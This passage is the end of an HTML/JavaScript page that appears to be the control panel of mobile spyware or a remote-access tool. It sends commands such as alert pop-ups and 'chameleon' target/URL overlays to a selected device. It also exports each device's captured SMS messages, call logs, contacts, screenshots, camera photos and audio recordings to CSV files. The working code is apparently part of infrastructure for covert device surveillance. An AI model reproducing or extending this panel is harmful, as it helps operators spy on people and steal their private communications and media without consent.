                paramContainer.style.display = 'none';
                alertParamContainer.style.display = 'none';
                chameleonParamContainer.style.display = 'none';
                paramInput.value = '';
                alertTitleInput.value = '';
                alertMessageInput.value = '';
                alertDurationInput.value = '15';
                chameleonTargetInput.value = '';
                chameleonUrlInput.value = '';

            } catch (error) {
                console.error("Error sending command:", error);
                statusEl.innerHTML = `<div class="alert alert-danger alert-sm p-2">Error sending command: ${error.message}</div>`;
            }
        });

        const exportToCsv = (filename, rows) => {
            if (!rows || rows.length === 0) {
                alert("No data to export.");
                return;
            }
            const processRow = (row) => {
                let finalVal = '';
                for (let j = 0; j < row.length; j++) {
                    let innerValue = row[j] === null || row[j] === undefined ? '' : String(row[j]);
                    if (String(row[j]).includes('"')) {
                        innerValue = innerValue.replace(/"/g, '""');
                    }
                    if (j > 0) finalVal += ',';
                    finalVal += `"${innerValue}"`;
                }
                return finalVal + '\r\n';
            };

            let csvFile = '';
            const headers = Object.keys(rows[0]);
            csvFile += processRow(headers);

            for (let i = 0; i < rows.length; i++) {
                const rowValues = headers.map(header => rows[i][header]);
                csvFile += processRow(rowValues);
            }

            const blob = new Blob([csvFile], { type: 'text/csv;charset=utf-8;' });
            const link = document.createElement("a");
            if (link.download !== undefined) {
                const url = URL.createObjectURL(blob);
                link.setAttribute("href", url);
                link.setAttribute("download", filename);
                link.style.visibility = 'hidden';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
        };
        document.querySelectorAll('.btn-export').forEach(button => {
            button.addEventListener('click', () => {
                if (!currentDeviceUid) { 
                    alert("Please select a device first before exporting.");
                    return;
                }
                const section = button.getAttribute('data-section');
                let dataToExport = currentDeviceDataCache[section];

                if (!dataToExport || dataToExport.length === 0) {
                     alert(`No data available to export for ${section}.`);
                     return;
                }
                
                let cleanedData = dataToExport; 
                if (['overview', 'battery', 'info', 'network'].includes(section) && dataToExport.length === 1 && typeof dataToExport[0] === 'object') {
                    cleanedData = [{}]; 
                    for(const key in dataToExport[0]) {
                       cleanedData[0][key.replace(/<[^>]*>/g, "")] = String(dataToExport[0][key]).replace(/<[^>]*>/g, "");
                    }
                } 
                else if (['screenshots', 'camera_photos', 'audio'].includes(section)) { 
                    cleanedData = dataToExport.map(s => ({ url: s.url, timestamp: formatTimestamp(s.timestamp), filename: s.filename || 'N/A' }));
                } 
                else if (Array.isArray(dataToExport)) { 
                    cleanedData = JSON.parse(JSON.stringify(dataToExport)).map(item => {
                       Object.keys(item).forEach(key => {
                           if (key.toLowerCase().includes('time') || key.toLowerCase().includes('date')) {
                               item[key] = formatTimestamp(item[key]);
                           }
                       });
                       if (item.duration) item.duration = formatDuration(item.duration);
                       if (item.type && section === 'sms') item.type = item.type === 1 || item.type === 'inbox' ? 'Inbox' : (item.type === 2 || item.type === 'sent' ? 'Sent' : 'Unknown');
                       if (item.type && section === 'calls') {
                           const types = {1: 'Incoming', 2: 'Outgoing', 3: 'Missed', 4: 'Voicemail', 5: 'Rejected', 6: 'Blocked'};
                           item.type = types[item.type] || 'Unknown';
                       }
                       if(item.phoneNumbers && Array.isArray(item.phoneNumbers)) item.phoneNumbers = item.phoneNumbers.join('; ');
                       
                       return item;
                   });
                }
                exportToCsv(`${currentDeviceUid}_${section}_export.csv`, cleanedData);
            });
        });

        showLoading();
    </script>
</body>
</html>